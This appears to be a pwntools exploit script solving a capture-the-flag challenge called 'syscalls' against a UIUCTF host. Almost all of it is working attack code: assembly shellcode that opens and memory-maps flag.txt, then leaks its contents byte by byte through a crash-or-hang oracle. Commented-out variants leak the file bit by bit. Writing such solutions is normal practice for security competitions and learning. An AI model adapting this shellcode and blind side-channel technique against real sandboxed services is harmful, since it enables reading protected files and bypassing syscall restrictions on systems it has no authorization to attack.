from pwn import *
from icecream import ic
import time
elf = exe = ELF("./syscalls")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        # return remote("syscalls.chal.uiuc.tf", 1337)
        return process(['ncat', '--ssl', 'syscalls.chal.uiuc.tf', '1337'])
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x12d6
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

# flag = ''
# for i in range(64):
#     for j in range(8):
#         io = start()
#         ic(flag)
#         shellcod = asm(f'''
#             mov rax, 0x101
#             mov rdi, -100
#             lea rsi,[rip+flag]
#             mov rdx, 0
#             xor r10, r10
#             syscall

#             mov r8, rax
#             xor r9, r9
#             mov r10, 2
#             mov rdx, 3
#             mov rsi, 0x1000
#             xor rdi, rdi
#             mov rax, 9
#             syscall
#             mov rbp, rax

#             mov rcx, [rax+{i}]
#             shr cl, {j}    
#             and cl, 0x1
#             cmp cl, 0x0
#             je label
#             mov rax, 60
#             syscall

#             label:
#             jmp label

#             flag: .string "flag.txt"
#         ''')
#         ru("The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.")
#         sl(shellcod)
#         try:
#             time.sleep(1)
#             sl(b'a')
#             time.sleep(1)
#             sl(b'b')
#             time.sleep(1)
#             sl(b'c')
#             time.sleep(1)
#             sl(b'd')
#             flag += '1'
#         except EOFError:
#             flag += '0'
#     flag += ' '

flag = ''
for i in range(8, 64):
    for j in range(0x7d, 0x30, -1):
        io = start()
        ic(flag)
        ic(chr(j))
        shellcod = asm(f'''
            mov rax, 0x101
            mov rdi, -100
            lea rsi,[rip+flag]
            mov rdx, 0
            xor r10, r10
            syscall

            mov r8, rax
            xor r9, r9
            mov r10, 2
            mov rdx, 3
            mov rsi, 0x1000
            xor rdi, rdi
            mov rax, 9
            syscall
            mov rbp, rax

            mov cl, BYTE PTR [rax+{i}]
            cmp cl, {j}    
            je label
            
            mov rax, 60
            syscall

            label:
            jmp label

            flag: .string "./flag.txt"
        ''')
        ru("The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.")
        sl(shellcod)
        try:
            time.sleep(1)
            sl(b'a')
            time.sleep(1)
            sl(b'b')
            time.sleep(1)
            sl(b'c')
            time.sleep(1)
            sl(b'd')
            flag += chr(j)
            break
        except EOFError:
            pass
        
        io.close()
    # flag += ' '

# io = start()
# shellcod = asm(f'''
#     mov rax, 0x101
#     mov rdi, -100
#     lea rsi,[rip+flag]
#     mov rdx, 0
#     xor r10, r10
#     syscall

#     mov r8, rax
#     xor r9, r9
#     mov r10, 2
#     mov rdx, 3
#     mov rsi, 0x1000
#     xor rdi, rdi
#     mov rax, 9
#     syscall
#     mov rbp, rax

#     mov rcx, [rax+0]
#     shr cl, 1  
#     and cl, 0x1
#     cmp cl, 0x1
#     je label
#     mov rax, 60
#     syscall

#     label:
#     jmp label

#     flag: .string "flag.txt"
# ''')
# ru("The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.")
# sl(shellcod)
# try:
#     time.sleep(1)
#     sl("BOOP")
#     print("YAY")
# except EOFError:
#     print("NAY")

io.interactive()
